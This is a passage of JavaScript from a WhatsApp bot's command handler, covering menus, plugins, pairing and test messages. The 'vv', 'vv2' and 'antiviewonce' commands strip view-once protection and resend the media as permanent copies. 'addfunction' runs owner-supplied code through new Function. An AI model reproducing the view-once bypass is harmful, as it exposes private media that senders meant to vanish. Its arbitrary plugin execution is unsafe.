          additionalNodes: [{
            tag: 'biz', attrs: {}, content: [{
              tag: 'interactive', attrs: { type: 'native_flow', v: '1' }, content: [{
                tag: 'native_flow', attrs: { v: '9', name: 'mixed' }
              }]
            }]
          }]
        });

      } catch (err) {
        console.error('Menu command crashed:', err);
        await sock.sendMessage(jid, { text: '❌ Menu error: ' + err.message }).catch(() => {});
      }
      break;
    }
case 'samsung':
case 'blacklord':
case 'menu5': {
  try {
    await reaction('🌹');
    const { date, time } = getDateTime();
    const up = formatUptime(Date.now() - global.botStartTime);
    const total = Object.values(CMDS).reduce((acc, arr) => acc + arr.length, 0);
    const botName = c.botName || settings.BOT_NAME || '_*~𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐔𝐋𝐓𝐑𝐀~*_';
    const owner = kontributor[0] || botNumber;
    const prefix = c.prefix || settings.DEFAULT_PREFIX || '.';

    let menuText = `
    
  •━═ 〘  _*~𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐔𝐋𝐓𝐑𝐀~*_   〙═━• 
    
`;
    menuText += ` ╭═━⪩ 〘 𝑶𝑵𝑬 𝑼𝑰 𝑺𝑻𝑨𝑻𝑼𝑺 〙•━•⩵꙰ཱི࿐\n`;
    menuText += ` │⫹⫺ 𝗚𝗔𝗟𝗔𝗫𝗬 𝗔𝗜: ${botName} 🟢\n`;
    menuText += ` │⫹⫺ 𝗢𝗡𝗘 𝗕𝗨𝗜𝗟𝗗: ${settings.VERSION || '1.0.0'}\n`;
    menuText += ` │⫹⫺ 𝗗𝗘𝗩𝗜𝗖𝗘 𝗠𝗢𝗗𝗘: ${mode}\n`;
    menuText += ` │⫹⫺ 𝗦𝗖𝗥𝗘𝗘𝗡 𝗧𝗜𝗠𝗘: ${up}\n`;
    menuText += ` │⫹⫺ 𝗔𝗜 𝗧𝗢𝗢𝗟𝗦: ${total}\n`;
    menuText += ` │⫹⫺ 𝗤𝗨𝗜𝗖𝗞 𝗞𝗘𝗬: ${prefix}\n`;
    menuText += ` │⫹⫺ 𝗚𝗔𝗟𝗔𝗫𝗬 𝗡𝗘𝗧𝗪𝗢𝗥𝗞: ${settings.COMPANY || 'N/A'}\n`;
    menuText += ` ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐\n\n`;

    menuText += ` •━══〘 𝐎𝐅𝐅𝐂 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 〙•━•⩵꙰ཱི࿐\n\n`;

    for (const [cat, list] of Object.entries(CMDS)) {
      if (!list || list.length === 0) continue;
      menuText += `> ╭═━⪩ 〖  ${cat.toUpperCase()}  〗═══━•⩵꙰ཱི࿐\n`;
      list.forEach(cmd => {
        menuText += `> │❍ ${cmd}\n`;
      });
      menuText += `> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐\n\n`;
    }

    // ── BLACKLORD CHAMBER PLUGINS ────────────────────────────────
    if (pluginNames.length > 0) {
      menuText += `> ╭═━⪩ 〖  BLACKLORD CHAMBER  〗═══━•⩵꙰ཱི࿐\n`;
      for (const pn of pluginNames) {
        menuText += `> │❍ ${pn}\n`;
      }
      menuText += `> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐\n\n`;
    }

    const imgUrl = getRotatingMenuImage(c.menuImg || settings.DEFAULT_MENU_IMG);
    let imageSent = false;

    // ---- helper to build the button row ----
    const getButtons = () => ([
      {
        buttonId: `${prefix}allmenu`,  // the command that will be sent when pressed
        buttonText: { displayText: '📋 All Commands' },
        type: 1
      }
    ]);

    // ---- try to send image with caption + buttons ----
    if (!c.iphoneMode && imgUrl) {
      let imgBuf = null;
      try {
        if (imgUrl.startsWith('data:')) {
          const b64 = imgUrl.split(',')[1];
          if (b64) imgBuf = Buffer.from(b64, 'base64');
        } else if (imgUrl.startsWith('http')) {
          const res = await axios.get(imgUrl, { responseType: 'arraybuffer', timeout: 12000 });
          imgBuf = Buffer.from(res.data);
        } else {
          imgBuf = fs.readFileSync(imgUrl);
        }
      } catch (e) {
        console.error('Menu image load error:', e.message);
        imgBuf = null;
      }

      if (imgBuf && imgBuf.length > 200) {
        try {
          await sock.sendMessage(jid, {
            image: imgBuf,
            caption: menuText,
            buttons: getButtons(),
            headerType: 4  // optional, for better header styling
          }, { quoted: qchanel });
          imageSent = true;
        } catch (e) {
          console.error('Menu image send error:', e.message);
          imageSent = false;
        }
      }
    }

    // ---- fallback: text message with buttons ----
    if (!imageSent) {
      await sock.sendMessage(jid, {
        text: menuText,
        buttons: getButtons()
      }, { quoted: qchanel });
    }

  } catch (err) {
    console.error('Menu command crashed:', err);
    await sock.sendMessage(jid, { text: '❌ Menu error: ' + err.message }).catch(() => {});
  }
  break;
}
    // ══════════════════════════════════════════════════════
    //   OWNER COMMANDS (addfunction, listplugins, delplugin)
    // ══════════════════════════════════════════════════════

    case 'addfunction':
    case 'addplugin': {
      if (needOwner()) break;
      if (!text) {
        return reply(
          `📌 *Add a custom plugin*\n\n` +
          `Usage: .addfunction <name>|<description>|<function_body>\n\n` +
          `Example:\n` +
          `.addfunction hello|Says hello|async function(sock, m, args, reply) { await reply("Hello from Blacklord!"); }`
        );
      }
      const parts = text.split('|');
      if (parts.length < 3) {
        return reply('❌ Invalid format. Use: name|description|function_body');
      }
      const name = parts[0].trim();
      const description = parts[1].trim();
      const functionBody = parts.slice(2).join('|').trim();
      if (!name || !description || !functionBody) {
        return reply('❌ All fields are required.');
      }
      try {
        const testFn = new Function(
          'sock', 'm', 'args', 'reply', 'reaction', 'ft', 'cfg', 'dlMedia', 'getQuoted', 'normNum', 'getTargetJid',
          `return (${functionBody})`
        );
        if (typeof testFn !== 'function') throw new Error('Not a function');
      } catch (e) {
        return reply(`❌ Invalid function body: ${e.message}`);
      }
      const plugin = { name, description, functionBody, ownerOnly: true, createdAt: Date.now() };
      try {
        savePlugin(plugin);
        await reply(`✅ Plugin "${name}" added successfully. Rebooting to apply...`);
        setTimeout(() => process.exit(0), 2000);
      } catch (e) {
        await reply(`❌ ${e.message}`);
      }
      break;
    }

    case 'listplugins':
    case 'plugins': {
      if (needOwner()) break;
      const data = readJSON(pluginsFile, []);
      if (!data.length) return reply('📋 No plugins installed.');
      const list = data.map((p, i) => `${i+1}. *${p.name}* – ${p.description}`).join('\n');
      await reply(`📋 *Plugins (${data.length})*\n\n${list}`);
      break;
    }

    case 'delplugin':
    case 'removeplugin': {
      if (needOwner()) break;
      const name = args[0];
      if (!name) return reply('Usage: .delplugin <plugin_name>');
      try {
        deletePlugin(name);
        await reply(`✅ Plugin "${name}" deleted. Rebooting...`);
        setTimeout(() => process.exit(0), 2000);
      } catch (e) {
        await reply(`❌ ${e.message}`);
      }
      break;
    }
    // ══════════════════════════════════════════════════════
    //   GENERAL
    // ══════════════════════════════════════════════════════
case 'prefixfree':
case 'setprefixfree': {
  if (!_isOwner) return reply('❌ Owner only.');

  // Toggle or set explicitly
  let newState;
  if (args.length === 0) {
    // Toggle
    newState = !c.prefixfree;
  } else {
    const arg = args[0].toLowerCase();
    if (arg === 'on' || arg === 'true' || arg === '1') newState = true;
    else if (arg === 'off' || arg === 'false' || arg === '0') newState = false;
    else return reply('❌ Invalid argument. Use `on`/`off` or leave empty to toggle.');
  }

  // Save the setting
  await setWaSetting(waNum, 'prefixfree', newState);
  // Update local c for immediate use (optional)
  c.prefixfree = newState;

  reply(`✅ Prefix‑free mode is now **${newState ? 'ON' : 'OFF'}**.`);
  break;
}case 'setsticker': {
    if (needOwner()) break;

    const { qMsg, qType } = getQuoted(m);
    if (qType !== 'stickerMessage') {
        await reply(
`Usage: Reply to a sticker with:
.setsticker <command>
Example: .setsticker menu
To remove: .setsticker -remove`
        );
        break;
    }

    const commandName = args[0]?.toLowerCase();
    if (!commandName) {
        await reply('❌ Provide a command name.\nExample: `.setsticker menu`');
        break;
    }

    const sticker = qMsg.stickerMessage;
    let hashBytes = sticker.fileSha256;
    if (!hashBytes) {
        await reply('❌ Could not read sticker hash.');
        break;
    }
    const buffer = Buffer.isBuffer(hashBytes) ? hashBytes : Buffer.from(hashBytes);
    const hashBase64 = buffer.toString('base64');

    if (commandName === '-remove') {
        setStickerCommand(hashBase64, null);
        await reply(`✅ Sticker command removed.`);
    } else {
        setStickerCommand(hashBase64, commandName);
        await reply(`✅ Sticker command set to: .${commandName}\nHash: ${hashBase64.slice(0, 16)}…`);
    }
    break;
}

case 'liststickers': {
    if (needOwner()) break;
    const map = getStickerCommands();
    const entries = Object.entries(map);
    if (!entries.length) {
        await reply('📋 No sticker commands set.');
        break;
    }
    const list = entries.map(([hash, cmd], i) => `${i+1}. ${hash.slice(0, 16)}… → .${cmd}`).join('\n');
    await reply(`📋 Sticker commands:\n${list}`);
    break;
}case 'vv': {
    const { qMsg, qType, qKey } = getQuoted(m);
    if (!qMsg) {
        await reply(
`Usage: Reply to a view‑once message`
        );
        break;
    }
    let inner = qMsg;
    for (const w of ['viewOnceMessage','viewOnceMessageV2','viewOnceMessageV2Extension']) {
        if (inner[w]?.message) { inner = inner[w].message; break; }
    }
    const voImg = inner.imageMessage;
    const voVid = inner.videoMessage;
    if (!voImg && !voVid) {
        await reply(`❌ Not a view‑once message.`);
        break;
    }
    try {
        const src = voImg ? { imageMessage: voImg } : { videoMessage: voVid };
        const buf = await dlMedia(src, qKey);
        if (voImg) {
            // Assumes replyImg() sends an image
            await replyImg(buf, '👁 Revealed');
        } else if (!cfg(sock).iphoneMode) {
            await sock.sendMessage(jid, { video: buf, caption: '👁 Revealed' }, { quoted: qchanel });
        } else {
            await reply(`👁 View‑once video revealed.`);
        }
    } catch (e) {
        await reply(`❌ Error: ${e.message}`);
    }
    break;
}case 'vv2':
case 'cute': {
    // Get quoted message (view‑once media)
    const quotedMsg = m.quoted ? m.quoted : (() => {
        const ctx = m.message?.extendedTextMessage?.contextInfo;
        if (ctx?.quotedMessage) {
            const qMsg = ctx.quotedMessage;
            const qType = Object.keys(qMsg).find(k => !['senderKeyDistributionMessage','messageContextInfo'].includes(k));
            return { message: qMsg, msg: qMsg[qType], type: qType };
        }
        return null;
    })();

    const userJid = sender; // user's private chat JID

    if (!quotedMsg) {
        await sock.sendMessage(userJid, { text: 'Usage: Reply to a view‑once media with .vv2' });
        break;
    }

    // Unwrap view‑once container
    let innerMsg = quotedMsg.message || quotedMsg;
    for (const w of ['viewOnceMessage','viewOnceMessageV2','viewOnceMessageV2Extension']) {
        if (innerMsg[w]?.message) {
            innerMsg = innerMsg[w].message;
            break;
        }
    }

    const imgMsg = innerMsg.imageMessage;
    const vidMsg = innerMsg.videoMessage;
    const audMsg = innerMsg.audioMessage;

    if (!imgMsg && !vidMsg && !audMsg) {
        await sock.sendMessage(userJid, { text: '❌ Not a view‑once message.' });
        break;
    }

    // Download media
    try {
        let mediaBuffer;
        let mediaType = '';
        let caption = '';

        if (imgMsg) {
            mediaBuffer = await dlMedia({ imageMessage: imgMsg }, m.key);
            mediaType = 'image';
            caption = '🔓 View‑Once Image\nFrom: ' + senderNumber;
        } else if (vidMsg) {
            mediaBuffer = await dlMedia({ videoMessage: vidMsg }, m.key);
            mediaType = 'video';
            caption = '🔓 View‑Once Video\nFrom: ' + senderNumber;
        } else if (audMsg) {
            mediaBuffer = await dlMedia({ audioMessage: audMsg }, m.key);
            mediaType = 'audio';
            caption = '🔓 View‑Once Audio\nFrom: ' + senderNumber;
        }

        // Send media to user's DM
        if (mediaType === 'image') {
            await sock.sendMessage(userJid, { image: mediaBuffer, caption: caption });
        } else if (mediaType === 'video') {
            await sock.sendMessage(userJid, { video: mediaBuffer, caption: caption });
        } else if (mediaType === 'audio') {
            await sock.sendMessage(userJid, { audio: mediaBuffer, mimetype: 'audio/mpeg', ptt: false });
        }

        // Success confirmation
        await sock.sendMessage(userJid, { text: `✅ ${mediaType.toUpperCase()} delivered to your DM.` });
    } catch (err) {
        console.error('View-once error:', err);
        await sock.sendMessage(userJid, { text: '❌ Failed to process view‑once media.' });
    }
    break;
}
      

    // ══════════════════════════════════════════════════════
    //   TEST: interactiveMessage format 1 (full native flow)
    // ══════════════════════════════════════════════════════
    case 'itest1': {
      if (needOwner()) break;
      await reaction('🧪');
      const imgUrl1 = c.menuImg || settings.DEFAULT_MENU_IMG || 'https://files.catbox.moe/c6wcqp.jpeg';

      // resolve menu image to buffer
      let imgField1 = { url: imgUrl1 };
      try {
        if (imgUrl1.startsWith('data:')) {
          const b64 = imgUrl1.split(',')[1];
          if (b64) imgField1 = Buffer.from(b64, 'base64');
        } else if (imgUrl1.startsWith('http')) {
          const res = await axios.get(imgUrl1, { responseType: 'arraybuffer', timeout: 12000 });
          imgField1 = Buffer.from(res.data);
        } else {
          imgField1 = fs.readFileSync(imgUrl1);
        }
      } catch { imgField1 = { url: imgUrl1 }; }

      const imgPayload1 = Buffer.isBuffer(imgField1)
        ? { image: imgField1 }
        : { image: imgField1 };

      try {
        await sock.sendMessage(jid, {
          interactiveMessage: {
            header: c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
            title:  c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
            footer: `© ${settings.CREDITS || 'james'} | ${settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects'}`,
            ...imgPayload1,
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify({
                limited_time_offer: {
                  text: `🔗 Pair your bot now!`,
                  url:  settings.REQUIRED_PAIR_LINK || 'https://t.me/animemdoff_bot',
                  copy_code: prefix,
                  expiration_time: Date.now() * 999,
                },
                bottom_sheet: {
                  in_thread_buttons_limit: 2,
                  divider_indices: [1, 2, 3, 4, 5, 999],
                  list_title: c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
                  button_title: 'Select an option',
                },
                tap_target_configuration: {
                  title:         c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
                  description:   settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects',
                  canonical_url: settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
                  domain:        'anime.md',
                  button_index:  0,
                },
              }),
              buttons: [
                {
                  name: 'single_select',
                  buttonParamsJson: JSON.stringify({
                    has_multiple_buttons: true,
                  }),
                },
                {
                  name: 'call_permission_request',
                  buttonParamsJson: JSON.stringify({
                    has_multiple_buttons: true,
                  }),
                },
                {
                  name: 'single_select',
                  buttonParamsJson: JSON.stringify({
                    title: '📋 Bot Menu',
                    sections: [
                      {
                        title: 'Quick Actions',
                        highlight_label: '⚡ Fast',
                        rows: [
                          {
                            title: `${prefix}menu`,
                            description: 'View all commands',
                            id: 'row_menu',
                          },
                          {
                            title: `${prefix}ping`,
                            description: 'Check bot speed',
                            id: 'row_ping',
                          },
                          {
                            title: `${prefix}alive`,
                            description: 'Check if bot is online',
                            id: 'row_alive',
                          },
                        ],
                      },
                      {
                        title: 'Links',
                        highlight_label: '🔗 Social',
                        rows: [
                          {
                            title: '📢 Channel',
                            description: 'Follow our Telegram channel',
                            id: 'row_channel',
                          },
                          {
                            title: '👥 Group',
                            description: 'Join our support group',
                            id: 'row_group',
                          },
                        ],
                      },
                    ],
                    has_multiple_buttons: true,
                  }),
                },
                {
                  name: 'cta_copy',
                  buttonParamsJson: JSON.stringify({
                    display_text: `📋 Copy Prefix`,
                    id:           'copy_prefix',
                    copy_code:    prefix,
                  }),
                },
              ],
            },
          },
        }, { quoted: m });
        await reply('✅ itest1 sent — check if image + native flow renders.');
      } catch (e) {
        await reply('❌ itest1 failed: ' + e.message);
      }
      break;
    }
case 'antiviewonce': {
    if (needOwner()) break;
    const arg = args[0]?.toLowerCase();
    let newState;
    if (arg === 'on' || arg === 'true' || arg === '1') {
        newState = true;
    } else if (arg === 'off' || arg === 'false' || arg === '0') {
        newState = false;
    } else {
        await reply(`Usage: .antiviewonce on/off\nCurrent: ${c.antiviewonce ? 'ON' : 'OFF'}`);
        break;
    }
    await setWaSetting(waNum, 'antiviewonce', newState);
    c.antiviewonce = newState;
    await reply(`✅ Anti‑view‑once is now ${newState ? 'ON' : 'OFF'}.`);
    break;
}
    // ══════════════════════════════════════════════════════
    //   TEST: interactiveMessage format 2 (minimal copy button)
    // ══════════════════════════════════════════════════════
    case 'itest2': {
      if (needOwner()) break;
      await reaction('🧪');
      const imgUrl2 = c.menuImg || settings.DEFAULT_MENU_IMG || 'https://files.catbox.moe/c6wcqp.jpeg';

      // resolve menu image to buffer
      let imgField2 = { url: imgUrl2 };
      try {
        if (imgUrl2.startsWith('data:')) {
          const b64 = imgUrl2.split(',')[1];
          if (b64) imgField2 = Buffer.from(b64, 'base64');
        } else if (imgUrl2.startsWith('http')) {
          const res = await axios.get(imgUrl2, { responseType: 'arraybuffer', timeout: 12000 });
          imgField2 = Buffer.from(res.data);
        } else {
          imgField2 = fs.readFileSync(imgUrl2);
        }
      } catch { imgField2 = { url: imgUrl2 }; }

      const imgPayload2 = Buffer.isBuffer(imgField2)
        ? { image: imgField2 }
        : { image: imgField2 };

      try {
        await sock.sendMessage(jid, {
          interactiveMessage: {
            header: c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
            title:  c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
            footer: `© ${settings.CREDITS || 'james'} | ${settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects'}`,
            ...imgPayload2,
            buttons: [
              {
                name: 'cta_copy',
                buttonParamsJson: JSON.stringify({
                  display_text: `📋 Copy Prefix: ${prefix}`,
                  id:           'copy_prefix_simple',
                  copy_code:    prefix,
                }),
              },
              {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                  display_text: '🔗 Pair Bot',
                  url:          settings.REQUIRED_PAIR_LINK || 'https://t.me/animemdoff_bot',
                  merchant_url: settings.REQUIRED_PAIR_LINK || 'https://t.me/animemdoff_bot',
                }),
              },
              {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                  display_text: '📢 Follow Channel',
                  url:          settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
                  merchant_url: settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
                }),
              },
            ],
          },
        }, { quoted: m });
        await reply('✅ itest2 sent — check if minimal interactive renders.');
      } catch (e) {
        await reply('❌ itest2 failed: ' + e.message);
      }
      break;
    }

              // ══════════════════════════════════════════════════════
    //   TEST: interactiveMessage with document + externalAdReply
    // ══════════════════════════════════════════════════════
    case 'itest3': {
      if (needOwner()) break;
      await reaction('🧪');

      const imgUrl3  = c.menuImg || settings.DEFAULT_MENU_IMG || 'https://files.catbox.moe/c6wcqp.jpeg';
      const botName3 = c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD';

      // resolve menu image to buffer for jpegThumbnail
      let thumbBuf = null;
      try {
        if (imgUrl3.startsWith('data:')) {
          const b64 = imgUrl3.split(',')[1];
          if (b64) thumbBuf = Buffer.from(b64, 'base64');
        } else if (imgUrl3.startsWith('http')) {
          const res = await axios.get(imgUrl3, { responseType: 'arraybuffer', timeout: 12000 });
          thumbBuf = Buffer.from(res.data);
        } else {
          thumbBuf = fs.readFileSync(imgUrl3);
        }
      } catch { thumbBuf = null; }

      // build a tiny valid PDF in memory so we don't need a real file
      const fakePdf = Buffer.from(
        '%PDF-1.4\n1 0 obj<</Type /Catalog /Pages 2 0 R>>endobj ' +
        '2 0 obj<</Type /Pages /Kids [3 0 R] /Count 1>>endobj ' +
        '3 0 obj<</Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]>>endobj\n' +
        'xref\n0 4\n0000000000 65535 f\n0000000009 00000 n\n' +
        '0000000058 00000 n\n0000000115 00000 n\ntrailer<</Size 4 /Root 1 0 R>>\n' +
        'startxref\n190\n%%EOF'
      );

      try {
        const payload3 = {
          interactiveMessage: {
            header:   botName3,
            title:    botName3,
            footer:   `© ${settings.CREDITS || 'james'} | ${settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects'}`,
            document:  fakePdf,
            mimetype: 'application/pdf',
            fileName: `${botName3.replace(/\s/g,'_')}.pdf`,
            contextInfo: {
              mentionedJid:   [sender],
              forwardingScore: 0,
              isForwarded:    false,
            },
            externalAdReply: {
              title:                botName3,
              body:                 settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects',
              mediaType:            3,
              thumbnailUrl:         imgUrl3.startsWith('http') ? imgUrl3 : undefined,
              mediaUrl:             settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
              sourceUrl:            settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
              showAdAttribution:    true,
              renderLargerThumbnail: false,
            },
            buttons: [
              {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                  display_text: '🔗 Pair Bot',
                  url:          settings.REQUIRED_PAIR_LINK    || 'https://t.me/animemdoff_bot',
                  merchant_url: settings.REQUIRED_PAIR_LINK    || 'https://t.me/animemdoff_bot',
                }),
              },
              {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                  display_text: '📢 Follow Channel',
                  url:          settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
                  merchant_url: settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
                }),
              },
              {
                name: 'cta_copy',
                buttonParamsJson: JSON.stringify({
                  display_text: `📋 Copy Prefix`,
                  id:           'copy_prefix_3',
                  copy_code:    prefix,
                }),
              },
            ],
          },
        };

        // attach jpegThumbnail if we got a buffer
        if (thumbBuf) payload3.interactiveMessage.jpegThumbnail = thumbBuf;

        await sock.sendMessage(jid, payload3, { quoted: m });
        await reply('✅ itest3 sent — check if document + ad reply + buttons render.');
      } catch (e) {
        await reply('❌ itest3 failed: ' + e.message);
      }
      break;
    }

    // ══════════════════════════════════════════════════════
    //   TEST: productMessage
    // ══════════════════════════════════════════════════════
    case 'itest4': {
      if (needOwner()) break;
      await reaction('🛒');

      const imgUrl4  = c.menuImg || settings.DEFAULT_MENU_IMG || 'https://files.catbox.moe/c6wcqp.jpeg';
      const botName4 = c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD';

      // resolve thumbnail
      let thumb4 = null;
      try {
        if (imgUrl4.startsWith('data:')) {
          const b64 = imgUrl4.split(',')[1];
          if (b64) thumb4 = Buffer.from(b64, 'base64');
        } else if (imgUrl4.startsWith('http')) {
          const res = await axios.get(imgUrl4, { responseType: 'arraybuffer', timeout: 12000 });
          thumb4 = Buffer.from(res.data);
        } else {
          thumb4 = fs.readFileSync(imgUrl4);
        }
      } catch { thumb4 = null; }

      try {
        const thumbField4 = thumb4
          ? { thumbnail: thumb4 }
          : { thumbnail: { url: imgUrl4 } };

        await sock.sendMessage(jid, {
          productMessage: {
            title:           botName4,
            description:     `🤖 ${botName4} – your ultimate WhatsApp bot.\n\nPrefix: ${prefix}\nOwner: ${kontributor[0] || botNumber}`,
            ...thumbField4,
            productId:       '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶MD001',
            retailerId:      settings.CREDITS || 'james',
            url:             settings.REQUIRED_PAIR_LINK || 'https://t.me/animemdoff_bot',
            body:            `Commands: ${Object.values(CMDS).flat().length}+ features`,
            footer:          `© ${settings.CREDITS || 'james'} | ${settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects'}`,
            priceAmount1000: 0,
            currencyCode:    'USD',
            buttons: [
              {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                  display_text: '🔗 Pair Now',
                  url:          settings.REQUIRED_PAIR_LINK    || 'https://t.me/animemdoff_bot',
                  merchant_url: settings.REQUIRED_PAIR_LINK    || 'https://t.me/animemdoff_bot',
                }),
              },
              {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                  display_text: '📢 Channel',
                  url:          settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
                  merchant_url: settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
                }),
              },
            ],
          },
        }, { quoted: m });
        await reply('✅ itest4 sent — check if product card renders.');
      } catch (e) {
        await reply('❌ itest4 failed: ' + e.message);
      }
      break;
    }

    // ══════════════════════════════════════════════════════
    //   TEST: eventMessage
    // ══════════════════════════════════════════════════════
    case 'itest5': {
      if (needOwner()) break;
      await reaction('📅');

      const botName5 = c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD';

      // build start/end: next round hour + 2 hours
      const now5      = Math.floor(Date.now() / 1000);
      const startTime = now5 + 3600;          // 1 hour from now
      const endTime   = now5 + 3600 + 7200;   // 3 hours from now

      // parse optional args: itest5 <name> | <description>
      const evParts = text.split('|').map(s => s.trim());
      const evName  = evParts[0] || `${botName5} – Bot Launch Event`;
      const evDesc  = evParts[1] || `Join us for a live demo of ${botName5}!\n\nPrefix: ${prefix}\nOwner: ${kontributor[0] || botNumber}`;

      try {
        await sock.sendMessage(jid, {
          eventMessage: {
            isCanceled:         false,
            name:               evName,
            description:        evDesc,
            location: {
              degreesLatitude:  0,
              degreesLongitude: 0,
              name:             settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects HQ',
            },
            joinLink:           settings.REQUIRED_GROUP_LINK || 'https://call.whatsapp.com/video/example',
            startTime:          String(startTime),
            endTime:            String(endTime),
            extraGuestsAllowed: true,
          },
        }, { quoted: m });
        await reply(
          `✅ itest5 sent — event card created.\n\n` +
          `📅 *${evName}*\n` +
          `🕐 Starts: ${new Date(startTime * 1000).toLocaleString()}\n` +
          `🕔 Ends: ${new Date(endTime * 1000).toLocaleString()}\n\n` +
          `_Tip: use \`${prefix}itest5 Event Name | Event description\` for custom content_`
        );
      } catch (e) {
        await reply('❌ itest5 failed: ' + e.message);
      }
      break;
    }

    case 'ping':   { const t = Date.now(); await reply(`🏓 Pong! ${Date.now()-t}ms`); break; }
    case 'speed':  { const t = Date.now(); await reply('Testing...'); await reply(`⚡ ${Date.now()-t}ms`); break; }
    case 'uptime': { await reply(`⏱ ${formatUptime(Date.now() - global.botStartTime)}`); break; }
    case 'alive':  { await reaction('✅'); await reply('✅ Alive and running!'); break; }

    // ── WhatsApp Pair Command — starts a NEW session ────────
    // Works exactly like Telegram /pair: creates wa_<tgId>_<phone> session
    // and sends the pairing code IN WhatsApp (DM to the sender).
    case 'pair': {
      if (!_isOwner) { await reply(`❌ Owner only command.`); break; }
      const pairNum = args[0]?.replace(/\D/g,'');
      if (!pairNum || pairNum.length < 7) {
        await reply(
          `📱 *${prefix}pair <number>*\n\n` +
          `Links a new WhatsApp number to this bot.\n` +
          `Example: *${prefix}pair 254704955033*\n\n` +
          `_(Owner only — starts a new session, never affects this one)_`
        );
        break;
      }

      // Build a session ID exactly like Telegram /pair does
      // Use a fixed "wa" tg-owner prefix so it matches the same format
      const ownerTgId = settings.OWNER_TELEGRAM_ID || 'wa';
      const newSessionId = `wa_${ownerTgId}_${pairNum}`;

      // Check if already connected
      if (global._activeSockets && global._activeSockets.has(newSessionId)) {
        await reply(`✅ +${pairNum} is already connected!\nUse *${prefix}delpair ${pairNum}* to disconnect.`);
        break;
      }

      await reply(`🔄 Starting new session for *+${pairNum}*...\nPairing code will arrive here shortly.`);

      // Use the global startWhatsApp exposed from index.js
      if (typeof global._startWhatsApp === 'function') {
        // Send pairing code back to THIS chat (jid) not to Telegram
        global._startWhatsApp(newSessionId, null, pairNum, null, async (code) => {
          await sock.sendMessage(jid, {
            text:
              `🔑 *Pairing Code for +${pairNum}*\n\n` +
              `\`${code}\`\n\n` +
              `📌 Open WhatsApp → Linked Devices → Link a Device → Link with phone number`,
          }, { quoted: m });
        }).catch(async (e) => {
          await reply(`❌ Session start failed: ${e.message}`);
        });
      } else {
        // Fallback if global not set yet — instruct owner to use Telegram /pair
        await reply(
          `⚠️ WhatsApp pair via WA is only available after the bot fully boots.\n\n` +
          `Use *Telegram /pair ${pairNum}* instead — it works the same way.`
        );
      }
      break;
    }

    case 'owner': {
      const ownerNum = kontributor[0] || botNumber;
      await sock.sendMessage(jid, {
        contacts: { displayName: 'Bot Owner', contacts: [{ vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Bot Owner\nTEL;type=CELL;waid=${ownerNum}:+${ownerNum}\nEND:VCARD` }] },
      }, { quoted: qchanel });
      break;
    }

    case 'support':   { await reply(`🆘 *Support*\nJoin: ${settings.REQUIRED_GROUP_LINK || 'Contact owner'}`); break; }
    case 'developer': { await reply(`👨‍💻 *Developer*\n${settings.CREDITS || 'james Official'}\n${settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 projects'}`); break; }
    case 'updates':   { await reply(`🔄 *Updates*\nv${settings.BOT_VERSION} – Latest\nChannel: ${settings.REQUIRED_CHANNEL_LINK || ''}`); break; }
    

    // ══════════════════════════════════════════════════════
    //   OWNER
    // ══════════════════════════════════════════════════════

